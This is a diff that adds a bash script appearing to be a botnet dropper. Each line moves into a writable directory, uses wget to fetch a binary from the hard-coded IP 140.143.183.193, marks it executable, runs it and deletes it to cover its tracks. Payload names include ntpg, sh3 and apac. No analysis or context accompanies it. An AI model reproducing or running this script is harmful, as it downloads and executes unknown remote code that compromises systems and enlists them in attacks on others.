@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://140.143.183.193/ntpg; chmod +x ntpg; ./ntpg; rm -rf ntpg
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://140.143.183.193/ssdf; chmod +x ssdf; ./ssdf; rm -rf ssdf
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://140.143.183.193/odsh; chmod +x odsh; ./odsh; rm -rf odsh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://140.143.183.193/balls; chmod +x balls; ./balls; rm -rf balls
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://140.143.183.193/franks; chmod +x franks; ./franks; rm -rf franks
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://140.143.183.193/squid; chmod +x squid; ./squid; rm -rf squid
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://140.143.183.193/croc; chmod +x croc; ./croc; rm -rf croc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://140.143.183.193/ftc; chmod +x ftc; ./ftc; rm -rf ftc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://140.143.183.193/pfyp; chmod +x pfyp; ./pfyp; rm -rf pfyp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://140.143.183.193/sh3; chmod +x sh3; ./sh3; rm -rf sh3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://140.143.183.193/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://140.143.183.193/apac; chmod +x apac; ./apac; rm -rf apac
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://140.143.183.193/tel; chmod +x tel; ./tel; rm -rf tel
